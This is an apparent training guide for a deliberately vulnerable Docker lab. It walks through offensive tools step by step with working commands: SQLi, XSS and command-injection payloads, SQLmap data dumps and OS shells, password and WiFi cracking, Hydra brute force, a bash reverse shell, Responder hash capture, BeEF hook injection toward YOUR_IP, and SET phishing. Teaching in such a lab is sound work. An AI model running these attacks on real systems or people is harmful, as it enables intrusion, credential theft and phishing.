# 🔐 Vulnerable Web Application Lab
## Complete Security Tools Demonstration Guide

---

## ⚠️ WARNING

This lab contains **INTENTIONAL** security vulnerabilities.
- **NEVER** deploy on public networks
- **ONLY** use in isolated lab environments
- **NEVER** test against systems you don't own
- **FOR EDUCATIONAL PURPOSES ONLY**

---

## 📋 Table of Contents

1. [Lab Setup](#1-lab-setup)
2. [Nmap - Network Scanner](#2-nmap---network-scanner)
3. [Metasploit Framework](#3-metasploit-framework)
4. [Burp Suite - Web Application Testing](#4-burp-suite---web-application-testing)
5. [Wireshark - Packet Analysis](#5-wireshark---packet-analysis)
6. [Nikto - Web Vulnerability Scanner](#6-nikto---web-vulnerability-scanner)
7. [Gobuster - Directory Discovery](#7-gobuster---directory-discovery)
8. [SQLmap - SQL Injection](#8-sqlmap---sql-injection)
9. [John the Ripper - Password Cracking](#9-john-the-ripper---password-cracking)
10. [Hashcat - GPU Password Cracking](#10-hashcat---gpu-password-cracking)
11. [Aircrack-ng - WiFi Cracking](#11-aircrack-ng---wifi-cracking)
12. [Hydra - Brute Force](#12-hydra---brute-force)
13. [Netcat - Network Utility](#13-netcat---network-utility)
14. [Responder - LLMNR/NBT-NS Poisoning](#14-responder---llmnrnbtns-poisoning)
15. [BeEF - Browser Exploitation](#15-beef---browser-exploitation)
16. [SET - Social Engineering Toolkit](#16-set---social-engineer-toolkit)
17. [Attack Chains](#17-attack-chains)

---

## 1. Lab Setup

### Prerequisites

- Docker and Docker Compose installed
- Kali Linux or similar security distribution
- 8GB RAM recommended
- 20GB free disk space

### Start the Lab

```bash
# Navigate to lab directory
cd /home/demonwarrior/Demonstration

# Start all containers
docker compose up -d

# Verify all containers are running
docker compose ps
```

### Initialize WordPress

1. Open http://localhost:8080 in browser
2. Complete WordPress installation
3. Set admin credentials (or use: admin/admin)

### Initialize Flask App

1. Open http://localhost:5000
2. Click "Setup / Reset DB" (if available)
3. Register a test account or use defaults:
   - `admin` / `admin`
   - `user` / `password`
   - `test` / `test123`

### Lab Services Map

```
┌─────────────────────────────────────────────────────────────┐
│                    VULNERABLE LAB NETWORK                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  FLASK APP (Port 5000)                                       │
│  ├── SQL Injection (/login, /messages)                       │
│  ├── XSS (/search, /posts)                                   │
│  ├── Command Injection (/ping, /dns)                         │
│  ├── IDOR (/profile?id=)                                     │
│  ├── File Upload (/upload)                                   │
│  └── SSRF (/fetch)                                           │
│                                                              │
│  WORDPRESS (Port 8080)                                       │
│  ├── WP Plugins                                              │
│  ├── User Enumeration                                         │
│  └── Brute Force                                             │
│                                                              │
│  METASPLOITABLE3                                             │
│  ├── HTTP (Port 81)                                          │
│  ├── HTTPS (Port 82)                                         │
│  ├── FTP (Port 2122)                                         │
│  ├── SSH (Port 2223)                                         │
│  ├── Telnet (Port 2323)                                      │
│  ├── MySQL (Port 3308)                                       │
│  ├── SMB (Port 4450)                                         │
│  └── PostgreSQL (Port 5434)                                  │
│                                                              │
│  MYSQL (Port 3307)                                           │
│  FTP (Port 2121)                                             │
│  SSH (Port 2222)                                             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Default Credentials

| Service | Username | Password |
|---------|----------|----------|
| Flask App | admin | admin |
| Flask App | user | password |
| Flask App | test | test123 |
| MySQL (Lab) | vulnuser | vulnpass |
| FTP | ftpuser | ftppass123 |
| SSH | sshuser | sshpass123 |
| Metasploitable | msfadmin | msfadmin |
| MySQL (MS3) | root | (empty) |

---

## 2. Nmap - Network Scanner

### Purpose
Discover hosts, ports, services, and vulnerabilities on the network.

### Step-by-Step

#### Step 1: Basic Scan
```bash
# Scan all ports with service detection
nmap -sV -p 1-10000 localhost

# Expected output:
# PORT     STATE SERVICE VERSION
# 2121/tcp open  ftp     vsftpd 3.0.3
# 2222/tcp open  ssh     OpenSSH 8.2
# 3307/tcp open  mysql   MySQL 5.7.44
# 5000/tcp open  http    Werkzeug/2.3.2
# 8080/tcp open  http    Apache httpd 2.4.57
```

#### Step 2: OS Detection
```bash
# Detect operating systems
sudo nmap -O localhost

# More aggressive
sudo nmap -A -T4 localhost
```

#### Step 3: Vulnerability Scripts
```bash
# Run all vulnerability scripts
nmap --script=vuln localhost

# Specific scripts
nmap --script=http-enum -p 5000,8080 localhost
nmap --script=smb-enum-shares.nse -p 4450 localhost
nmap --script=ssh-auth-methods -p 2223 localhost
```

#### Step 4: Metasploitable Scan
```bash
# Full Metasploitable scan
nmap -sV -sC -p 81,82,2122,2223,2323,3308,4450 localhost

# Vulnerability assessment
nmap --script=vuln -p 81,2122,2223,3308,4450 localhost
```

### Results Interpretation

| Port | Service | Vulnerability |
|------|---------|---------------|
| 2122 | FTP | Anonymous login, weak passwords |
| 2223 | SSH | Weak passwords, outdated version |
| 3308 | MySQL | Default credentials, weak passwords |
| 4450 | SMB | EternalBlue, null sessions |
| 5000 | HTTP | SQLi, XSS, Command Injection |

---

## 3. Metasploit Framework

### Purpose
Exploit known vulnerabilities in services and applications.

### Step-by-Step

#### Step 1: Start Metasploit
```bash
msfconsole

# Wait for prompt:
# msf6 >
```

#### Step 2: vsftpd Backdoor Exploit
```bash
# Search for vsftpd exploits
search vsftpd

# Select the backdoor exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# Set target
set RHOSTS localhost
set RPORT 2122

# Run the exploit
exploit

# You should get a shell:
# [*] Command shell session 1 opened
# id
# uid=0(root) gid=0(root) groups=0(root)
```

#### Step 3: MySQL Login Scanner
```bash
# Select MySQL scanner
use auxiliary/scanner/mysql/mysql_login

# Set credentials
set RHOSTS localhost
set RPORT 3308
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt

# Run scan
run

# If successful:
# [+] 127.0.0.1:3308 - Success: 'root':''
```

#### Step 4: SSH Brute Force
```bash
# Select SSH scanner
use auxiliary/scanner/ssh/ssh_login

# Set target
set RHOSTS localhost
set RPORT 2223
set USERNAME msfadmin
set PASS_FILE /usr/share/wordlists/rockyou.txt

# Run
run

# If successful:
# [+] 127.0.0.1:2223 - Success: 'msfadmin':'msfadmin'
```

#### Step 5: SMB Enumeration
```bash
# SMB version detection
use auxiliary/scanner/smb/smb_version
set RHOSTS localhost
set RPORT 4450
run

# SMB shares
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS localhost
set RPORT 4450
run
```

---

## 4. Burp Suite - Web Application Testing

### Purpose
Intercept, analyze, and manipulate HTTP traffic for web application testing.

### Step-by-Step

#### Step 1: Configure Burp Suite
```
1. Open Burp Suite
2. Go to Proxy → Options
3. Verify listener: 127.0.0.1:8080
4. Go to Proxy → Intercept
5. Turn ON Intercept
```

#### Step 2: Configure Browser
```
1. Open Firefox/Chrome
2. Install FoxyProxy or configure proxy manually:
   - HTTP Proxy: 127.0.0.1
   - Port: 8080
3. Install Burp CA certificate:
   - Visit http://burpsuite
   - Download CA certificate
   - Import into browser certificate store
```

#### Step 3: Test SQL Injection
```
1. Navigate to http://localhost:5000/login
2. Enter username: admin
3. Enter password: test
4. Click Login
5. In Burp, intercept the request
6. Send to Repeater (Ctrl+R)
7. Modify username to: admin' OR '1'='1
8. Send request
9. Observe successful login
```

#### Step 4: Test XSS
```
1. Navigate to http://localhost:5000/search?q=test
2. Intercept request
3. Send to Repeater
4. Change q parameter to: <script>alert('XSS')</script>
5. Send request
6. Observe script execution in response
```

#### Step 5: Test IDOR
```
1. Log in and go to http://localhost:5000/profile?id=1
2. Intercept request
3. Send to Repeater
4. Change id parameter to: 2, 3, 4
5. Observe different user data returned
```

#### Step 6: Test Command Injection
```
1. Navigate to http://localhost:5000/ping?host=127.0.0.1
2. Intercept request
3. Send to Repeater
4. Change host to: 127.0.0.1; cat /etc/passwd
5. Send request
6. Observe /etc/passwd in response
```

#### Step 7: Intruder (Brute Force)
```
1. Intercept login request
2. Send to Intruder (Ctrl+I)
3. Set positions: username and password fields
4. Load wordlists
5. Start attack
6. Analyze response lengths for valid credentials
```

---

## 5. Wireshark - Packet Analysis

### Purpose
Capture and analyze network traffic to understand protocols and extract data.

### Step-by-Step

#### Step 1: Start Capture
```bash
# Start Wireshark
sudo wireshark &

# Or use command line
sudo tshark -i any -w capture.pcap
```

#### Step 2: Capture HTTP Traffic
```
1. Select interface (docker0 or br-*)
2. Click Start
3. Apply display filter: http
4. Perform actions in browser
5. Observe HTTP requests/responses
```

#### Step 3: Extract Credentials
```bash
# Filter for POST requests (login forms)
http.request.method == "POST"

# Filter for specific host
http.host == "localhost:5000"

# Follow TCP stream
1. Right-click on packet
2. Select Follow → TCP Stream
3. View complete conversation
```

#### Step 4: Analyze FTP Traffic
```bash
# Filter FTP commands
ftp

# Filter FTP data
ftp-data

# Extract FTP credentials
ftp.request.command == "PASS"
```

#### Step 5: Analyze MySQL Traffic
```bash
# Filter MySQL traffic
mysql

# Extract SQL queries
mysql.query contains "SELECT"

# Filter by port
tcp.port == 3308
```

#### Step 6: Capture Wireless Handshake
```bash
# Start capture on wireless interface
sudo wireshark -i wlan0mon -w handshake.pcap

# Apply filter for EAPOL (4-way handshake)
eapol
```

### Useful Display Filters

| Filter | Description |
|--------|-------------|
| `http` | All HTTP traffic |
| `http.request.method == "POST"` | POST requests |
| `ftp` | FTP traffic |
| `mysql` | MySQL traffic |
| `tcp.port == 5000` | Flask app traffic |
| `tcp.port == 3308` | MySQL traffic |
| `tcp.port == 2121` | FTP traffic |

---

## 6. Nikto - Web Vulnerability Scanner

### Purpose
Scan web servers for vulnerabilities, misconfigurations, and dangerous files.

### Step-by-Step

#### Step 1: Basic Scan
```bash
# Scan Flask app
nikto -h http://localhost:5000

# Output includes:
# + Server: Werkzeug/2.3.2
# + /admin: Admin panel found
# + /debug: Debug endpoint found
# + /api/users: API endpoint found
```

#### Step 2: Scan Multiple Targets
```bash
# Scan WordPress
nikto -h http://localhost:8080

# Scan Metasploitable
nikto -h http://localhost:81

# Scan with authentication
nikto -h http://localhost:5000 -id admin:admin
```

#### Step 3: Evasion Techniques
```bash
# Randomize User-Agent
nikto -h http://localhost:5000 -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Use different case
nikto -h http://localhost:5000 -evasion 1
```

#### Step 4: Save Results
```bash
# Save to HTML report
nikto -h http://localhost:5000 -o report.html -Format html

# Save to CSV
nikto -h http://localhost:5000 -o results.csv -Format csv
```

#### Step 5: Analyze Output
```
Common findings:
+ Server: Software version disclosed
+ /debug: Exposed debug endpoint
+ /api/users: Unprotected API
+ No X-Frame-Options header
+ No Content-Security-Policy header
+ OSVDB-3092: /admin/: Admin directory found
```

---

## 7. Gobuster - Directory Discovery

### Purpose
Brute-force directories, files, and subdomains to discover hidden content.

### Step-by-Step

#### Step 1: Basic Directory Scan
```bash
# Scan Flask app
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt

# Output:
# /api (Status: 302)
# /debug (Status: 302)
# /login (Status: 302)
# /posts (Status: 302)
# /upload (Status: 302)
```

#### Step 2: Scan with Extensions
```bash
# Check for common file types
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,config,sql

# Output might show:
# /config.php (Status: 403)
# /backup.sql (Status: 200)
# /admin.php (Status: 403)
```

#### Step 3: Multi-threaded Scan
```bash
# Use 50 threads for faster scanning
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -t 50

# Verbose output
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -v
```

#### Step 4: Scan WordPress
```bash
# Scan WordPress directories
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt -x php

# Common WordPress findings:
# /wp-admin
# /wp-content
# /wp-includes
# /wp-login.php
```

#### Step 5: DNS Subdomain Enumeration
```bash
# Enumerate subdomains
gobuster dns -u vulnapp.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1mil-5000.txt

# With custom resolver
gobuster dns -u vulnapp.local -w wordlist.txt -r 8.8.8.8
```

#### Step 6: Vhost Enumeration
```bash
# Find virtual hosts
gobuster vhost -u http://localhost:5000 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1mil-5000.txt
```

---

## 8. SQLmap - SQL Injection

### Purpose
Automatically detect and exploit SQL injection vulnerabilities.

### Step-by-Step

#### Step 1: Basic Detection
```bash
# Test a URL parameter
sqlmap -u "http://localhost:5000/messages?sender=admin"

# SQLmap will:
# 1. Test for injection types
# 2. Identify database type
# 3. List available databases
```

#### Step 2: Test POST Data
```bash
# Test login form
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test"

# With cookie
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" --cookie="session=abc123"
```

#### Step 3: Enumerate Databases
```bash
# List all databases
sqlmap -u "http://localhost:5000/messages?sender=admin" --dbs

# Output:
# [*] information_schema
# [*] mysql
# [*] vulnapp
```

#### Step 4: Enumerate Tables
```bash
# List tables in vulnapp database
sqlmap -u "http://localhost:5000/messages?sender=admin" -D vulnapp --tables

# Output:
# [*] user
# [*] post
# [*] message
```

#### Step 5: Dump Table Data
```bash
# Dump user table
sqlmap -u "http://localhost:5000/messages?sender=admin" -D vulnapp -T user --dump

# Output:
# +----+----------+---------------------------------------------+-------+
# | id | username | password                                    | role  |
# +----+----------+---------------------------------------------+-------+
# | 1  | admin    | 21232f297a57a5a743894a0e4a801fc3           | admin |
# | 2  | user     | 5f4dcc3b5aa765d61d8327deb882cf99           | user  |
# +----+----------+---------------------------------------------+-------+
```

#### Step 6: Get OS Shell
```bash
# Get interactive shell
sqlmap -u "http://localhost:5000/messages?sender=admin" --os-shell

# Commands:
# sqlmap> id
# uid=1001(mysql) gid=1001(mysql) groups=1001(mysql)

# sqlmap> ls
# /var/lib/mysql
```

#### Step 7: Bypass WAF
```bash
# Use tamper scripts
sqlmap -u "http://localhost:5000/messages?sender=admin" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "http://localhost:5000/messages?sender=admin" --tamper=space2comment,between,randomcase
```

---

## 9. John the Ripper - Password Cracking

### Purpose
Crack password hashes using dictionary and brute-force attacks.

### Step-by-Step

#### Step 1: Extract Hashes from API
```bash
# Get hashes from Flask app API
curl -s http://localhost:5000/api/users | python3 -c "
import sys, json
data = json.load(sys.stdin)
for user in data:
    print(f'{user[\"username\"]}:{user[\"password_hash\"]}')
" > hashes.txt

# View hashes
cat hashes.txt
# admin:21232f297a57a5a743894a0e4a801fc3
# user:5f4dcc3b5aa765d61d8327deb882cf99
# test:cc03e747566b8a4504e682b2bc4e5023
```

#### Step 2: Auto-detect Hash Type
```bash
# Let John identify the hash type
john hashes.txt

# Output:
# Using default input encoding: UTF-8
# Loaded 3 password hashes with 3 different salts (Raw-MD5 [128/128 AVX 4x3])
```

#### Step 3: Wordlist Attack
```bash
# Use rockyou wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Output:
# admin            (admin)
# password         (user)
# test123          (test)
```

#### Step 4: Show Cracked Passwords
```bash
# Display cracked hashes
john --show hashes.txt

# Output:
# admin:admin
# user:password
# test:test123

# 3 password hashes cracked, 0 left
```

#### Step 5: Rules-based Attack
```bash
# Apply rules for mutations
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# Rules append numbers, symbols, change case, etc.
```

#### Step 6: Format-Specific Cracking
```bash
# Specify hash format
john --format=raw-md5 hashes.txt

# For SHA-256
john --format=raw-sha256 hashes.txt
```

---

## 10. Hashcat - GPU Password Cracking

### Purpose
High-speed password cracking using GPU acceleration.

### Step-by-Step

#### Step 1: Prepare Hashes
```bash
# Extract hashes in hashcat format
curl -s http://localhost:5000/api/users | python3 -c "
import sys, json
data = json.load(sys.stdin)
for user in data:
    print(user['password_hash'])
" > hashes.txt

# View hashes
cat hashes.txt
# 21232f297a57a5a743894a0e4a801fc3
# 5f4dcc3b5aa765d61d8327deb882cf99
# cc03e747566b8a4504e682b2bc4e5023
```

#### Step 2: Identify Hash Mode
```bash
# Find hash mode for MD5
hashcat --help | grep -i md5
#   0 | MD5
```

#### Step 3: Dictionary Attack
```bash
# Crack MD5 hashes (mode 0)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Output:
# 21232f297a57a5a743894a0e4a801fc3:admin
# 5f4dcc3b5aa765d61d8327deb882cf99:password
# cc03e747566b8a4504e682b2bc4e5023:test123
```

#### Step 4: Rule-based Attack
```bash
# Apply rules for password mutations
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Rules add:
# - Numbers (password123)
# - Symbols (password!)
# - Case changes (Password)
```

#### Step 5: Brute Force
```bash
# Attack all 4-character passwords
hashcat -m 0 hashes.txt -a 3 ?a?a?a?a

# Mask characters:
# ?l = lowercase
# ?u = uppercase
# ?d = digits
# ?s = symbols
# ?a = all characters
```

#### Step 6: Show Results
```bash
# Display cracked passwords
hashcat -m 0 hashes.txt --show

# Output:
# 21232f297a57a5a743894a0e4a801fc3:admin
# 5f4dcc3b5aa765d61d8327deb882cf99:password
# cc03e747566b8a4504e682b2bc4e5023:test123
```

---

## 11. Aircrack-ng - WiFi Cracking

### Purpose
Capture and crack WiFi handshakes to recover wireless passwords.

### Prerequisites
- WiFi adapter supporting monitor mode
- Already in monitor mode (wlan0mon)

### Step-by-Step

#### Step 1: Verify Monitor Mode
```bash
# Check wireless interfaces
iwconfig

# Should show:
# wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz
```

#### Step 2: Scan Networks
```bash
# Scan for available networks
sudo airodump-ng wlan0mon

# Output:
# BSSID              CH  MB  ENC  CIPHER  AUTH  ESSID
# XX:XX:XX:XX:XX:XX  6   54  WPA2 CCMP    PSK   HomeNetwork
# YY:YY:YY:YY:YY:YY  11  54  WPA2 CCMP    PSK   OfficeWiFi
```

#### Step 3: Target Specific Network
```bash
# Capture handshake from target
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX -c 6 -w capture wlan0mon

# Flags:
# --bssid = Target access point MAC
# -c 6 = Channel number
# -w capture = Output filename
```

#### Step 4: Deauth Client
```bash
# Force client to reconnect (in new terminal)
sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX wlan0mon

# Wait for "WPA handshake: XX:XX:XX:XX:XX:XX" in airodump
```

#### Step 5: Crack Handshake
```bash
# Dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Filter by BSSID
aircrack-ng -b XX:XX:XX:XX:XX:XX -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Output:
# KEY FOUND! [ password123 ]
```

#### Step 6: Advanced Attacks
```bash
# PMKID attack (no client needed)
hcxdumptool -i wlan0mon --enable_status -o capture.pcapng
hcxpcapngtool -o hash.txt capture.pcapng
hashcat -m 22000 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 12. Hydra - Brute Force

### Purpose
Brute-force login credentials for various services.

### Step-by-Step

#### Step 1: SSH Brute Force
```bash
# Brute force SSH (Metasploitable)
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://localhost:2223

# Output:
# [2222][ssh] host: localhost   login: msfadmin   password: msfadmin
```

#### Step 2: FTP Brute Force
```bash
# Brute force FTP
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://localhost:2121

# With verbose output
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://localhost:2121 -V
```

#### Step 3: HTTP Form Brute Force
```bash
# Brute force login form
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/login:username=^USER^&password=^PASS^:Login failed"

# With cookies
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect:H=Cookie: session=abc123"
```

#### Step 4: MySQL Brute Force
```bash
# Brute force MySQL
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://localhost:3308
```

#### Step 5: Multiple Users
```bash
# Create users.txt
echo -e "admin\nroot\nmsfadmin\nuser" > users.txt

# Brute force with multiple users
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://localhost:2223
```

#### Step 6: Advanced Options
```bash
# Parallel tasks (4 threads)
hydra -l admin -P passwords.txt -t 4 localhost http-post-form "/login:user=^USER^&pass=^PASS^"

# Resume interrupted session
hydra -R

# Increase verbosity
hydra -V -l admin -P passwords.txt ssh://localhost
```

---

## 13. Netcat - Network Utility

### Purpose
Swiss army knife for network connections, banner grabbing, and data transfer.

### Step-by-Step

#### Step 1: Banner Grabbing
```bash
# FTP banner
nc localhost 2121
# Output: 220 (vsFTPd 3.0.3)

# SSH banner
nc localhost 2223
# Output: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3

# HTTP banner
nc localhost 5000
GET / HTTP/1.1
Host: localhost
# Output: HTTP/1.0 200 OK
```

#### Step 2: Port Scanning
```bash
# Scan ports 1-1000
nc -zv localhost 1-1000

# Scan specific ports
nc -zv localhost 21 22 80 443 3306 5000
```

#### Step 3: File Transfer
```bash
# Terminal 1 - Receiver
nc -lvnp 4444 > received_file.txt

# Terminal 2 - Sender
nc localhost 4444 < file_to_send.txt
```

#### Step 4: Chat
```bash
# Terminal 1 - Server
nc -lvnp 9999

# Terminal 2 - Client
nc localhost 9999
```

#### Step 5: Reverse Shell
```bash
# Terminal 1 - Attacker (Listener)
nc -lvnp 4444

# Terminal 2 - Target (Vulnerable App)
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# You now have a shell on the attacker machine
```

#### Step 6: Remote Command Execution
```bash
# Execute command on remote host
echo "id" | nc localhost 2223

# Interactive session
nc -v localhost 2223
```

---

## 14. Responder - LLMNR/NBT-NS Poisoning

### Purpose
Poison network name resolution to capture NTLM hashes from Windows machines.

### Step-by-Step

#### Step 1: Start Responder
```bash
# Start Responder on interface
sudo responder -I eth0 -wrf

# Flags:
# -I = Interface
# -w = WPAD
# -r = LLMNR
# -f = NBT-NS
```

#### Step 2: Analyze Mode
```bash
# Analyze only (don't poison)
sudo responder -I eth0 -A

# Shows what Responder would capture
```

#### Step 3: Capture NTLM Hashes
```
# When Windows machine tries to access a resource:
# 1. Responder responds to name resolution
# 2. Windows sends NTLM hash to Responder
# 3. Hash is captured in /usr/share/responder/logs/

# Example output:
# [SMB] NTLMv2-SSP Hash   :: admin:SAMPLE:1122334455667788:ABCDEF...
```

#### Step 4: Crack NTLM Hash
```bash
# Save hash to file
echo 'admin:SAMPLE:1122334455667788:ABCDEF1234567890ABCDEF1234567890:0101000000000000000000000000000000000000000000000000000000000000' > ntlm_hash.txt

# Crack with hashcat
hashcat -m 5600 ntlm_hash.txt /usr/share/wordlists/rockyou.txt

# Or with John
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hash.txt
```

---

## 15. BeEF - Browser Exploitation

### Purpose
Hook browsers and execute commands through XSS vulnerabilities.

### Step-by-Step

#### Step 1: Start BeEF
```bash
# Navigate to BeEF directory
cd /path/to/beef

# Start BeEF
./beef

# Access console at:
# http://127.0.0.1:3000/ui/panel
```

#### Step 2: Hook a Browser
```html
<!-- Inject this via stored XSS on /posts -->
<script src="http://YOUR_IP:3000/hook.js"></script>
```

#### Step 3: Access BeEF Console
```
1. Open http://YOUR_IP:3000/ui/panel
2. Login (default: beef/beef)
3. See hooked browsers in "Hooked Browsers"
```

#### Step 4: Execute Commands
```
1. Select hooked browser
2. Navigate command modules:
   - Browser → Get Browser Info
   - Network → Get Internal IP
   - Social Engineering → Create Phishing Page
   - Exploits → Various browser exploits
```

#### Step 5: Persistent Hooking
```javascript
// Inject for persistent access
<script>
// Check if already hooked
if (!window.beef) {
    var s = document.createElement('script');
    s.src = 'http://YOUR_IP:3000/hook.js';
    document.body.appendChild(s);
}
</script>
```

---

## 16. SET - Social Engineer Toolkit

### Purpose
Perform social engineering attacks including phishing and credential harvesting.

### Step-by-Step

#### Step 1: Start SET
```bash
setoolkit
```

#### Step 2: Select Attack
```
1) Social-Engineering Attacks
   → Select 1

2) Website Attack Vectors
   → Select 2

3) Credential Harvester Attack
   → Select 3

4) Site Cloner
   → Select 2
```

#### Step 3: Configure Attack
```
1. Enter listener IP: YOUR_IP
2. Enter URL to clone: http://localhost:5000
3. SET clones the site
4. Victims visit YOUR_IP
5. Credentials are captured
```

#### Step 4: Harvest Credentials
```
# When victim submits credentials:
# [+] Credential Harvester is now listening
# [+] Credentials harvested:
#     Username: admin
#     Password: secret123

# Credentials saved to:
# /setoolkit/reports/credentials.txt
```

#### Step 5: Spear Phishing
```
1) Social-Engineering Attacks
2) Spear-Phishing Attack Vectors
3) Create a Payload and Listener
4. Select payload (e.g., windows/meterpreter/reverse_tcp)
5. Generate malicious file
6. Send to target
```

---

## 17. Attack Chains

### Chain 1: Full Web Application Compromise

```
┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐
│  Nmap   │ →  │  Nikto  │ →  │ Gobuster│ →  │  SQLmap │
│ Discover│    │  Enum   │    │  Find   │    │  Exploit│
│ services│    │ vulns   │    │ dirs    │    │   SQLi  │
└─────────┘    └─────────┘    └─────────┘    └─────────┘
                                                       │
                                                       ▼
┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐
│  BeEF   │ ←  │  John   │ ←  │Wireshark│ ←  │  Burp   │
│ Browser │    │  Crack  │    │ Capture │    │ Intercept│
│ exploit │    │ hashes  │    │ traffic │    │ requests│
└─────────┘    └─────────┘    └─────────┘    └─────────┘
```

**Steps:**
1. Nmap discovers services
2. Nikto identifies vulnerabilities
3. Gobuster finds hidden directories
4. SQLmap exploits SQL injection
5. Wireshark captures credentials
6. John cracks password hashes
7. Burp Suite tests web app logic
8. BeEF hooks browsers via XSS

### Chain 2: Network Service Attack

```
┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐
│  Nmap   │ →  │Metasploit│ →  │  Hydra  │ →  │Resonder │
│ Discover│    │  Exploit │    │ Brute   │    │ Poison  │
│ services│    │ vsftpd   │    │ force   │    │ network │
└─────────┘    └─────────┘    └─────────┘    └─────────┘
                                                       │
                                                       ▼
┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐
│  Netcat │ ←  │  John   │ ←  │Hashcat  │ ←  │Wireshark│
│ Shell   │    │  Crack  │    │  GPU    │    │ Capture │
│ access  │    │ hashes  │    │ crack   │    │ NTLM    │
└─────────┘    └─────────┘    └─────────┘    └─────────┘
```

**Steps:**
1. Nmap scans for open ports
2. Metasploit exploits vsftpd backdoor
3. Hydra brute-forces SSH/FTP
4. Responder captures NTLM hashes
5. Wireshark analyzes traffic
6. Hashcat cracks captured hashes
7. John cracks database hashes
8. Netcat provides shell access

### Chain 3: WiFi to Internal Network

```
┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐
│Aircrack │ →  │Wireshark│ →  │Responder│ →  │  Hydra  │
│  Crack  │    │ Capture │    │ Poison  │    │ Brute   │
│   WiFi  │    │ traffic │    │ network │    │ force   │
└─────────┘    └─────────┘    └─────────┘    └─────────┘
                                                       │
                                                       ▼
┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐
│Metasploit│ ←  │  SQLmap │ ←  │ Gobuster│ ←  │  Nmap   │
│ Exploit  │    │  SQLi   │    │  Find   │    │ Discover│
│ services │    │ exploit │    │   dirs  │    │ internal│
└─────────┘    └─────────┘    └─────────┘    └─────────┘
```

**Steps:**
1. Aircrack-ng cracks WiFi password
2. Wireshark captures network traffic
3. Responder poisons name resolution
4. Hydra brute-forces internal services
5. Nmap scans internal network
6. Gobuster discovers hidden content
7. SQLmap exploits SQL injection
8. Metasploit exploits vulnerabilities

### Chain 4: Social Engineering Attack

```
┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐
│  SET    │ →  │  BeEF   │ →  │Wireshark│ →  │  John   │
│Phishing │    │ Hook    │    │ Capture │    │  Crack  │
│ site    │    │ browser │    │ traffic │    │ hashes  │
└─────────┘    └─────────┘    └─────────┘    └─────────┘
                                                       │
                                                       ▼
┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐
│  Burp   │ ←  │  Hydra  │ ←  │  Nmap   │ ←  │Metasploit│
│ Intercept│    │ Brute   │    │ Discover│    │ Exploit  │
│ requests│    │ force   │    │ targets │    │ access   │
└─────────┘    └─────────┘    └─────────┘    └─────────┘
```

**Steps:**
1. SET creates phishing site
2. BeEF hooks victim's browser
3. Wireshark captures credentials
4. John cracks password hashes
5. Metasploit exploits vulnerabilities
6. Nmap discovers network resources
7. Hydra brute-forces services
8. Burp Suite analyzes web traffic

---

## 📊 Quick Reference

### Port Mapping

| Service | Host Port | Container Port |
|---------|-----------|----------------|
| Flask App | 5000 | 5000 |
| MySQL | 3307 | 3306 |
| FTP | 2121 | 21 |
| SSH | 2222 | 2222 |
| WordPress | 8080 | 80 |
| MS3 HTTP | 81 | 80 |
| MS3 HTTPS | 82 | 443 |
| MS3 FTP | 2122 | 21 |
| MS3 SSH | 2223 | 22 |
| MS3 Telnet | 2323 | 23 |
| MS3 MySQL | 3308 | 3306 |
| MS3 SMB | 4450 | 445 |
| MS3 PostgreSQL | 5434 | 5432 |

### Tool Commands

| Tool | Quick Command |
|------|---------------|
| Nmap | `nmap -sV localhost` |
| Nikto | `nikto -h http://localhost:5000` |
| Gobuster | `gobuster dir -u http://localhost:5000 -w wordlist.txt` |
| SQLmap | `sqlmap -u "http://localhost:5000/messages?sender=admin" --dbs` |
| John | `john --wordlist=rockyou.txt hashes.txt` |
| Hashcat | `hashcat -m 0 hashes.txt rockyou.txt` |
| Hydra | `hydra -l admin -P rockyou.txt ssh://localhost` |
| Netcat | `nc localhost 2121` |
| Metasploit | `msfconsole` |

---

## 🛠️ Cleanup

```bash
# Stop all containers
docker compose down

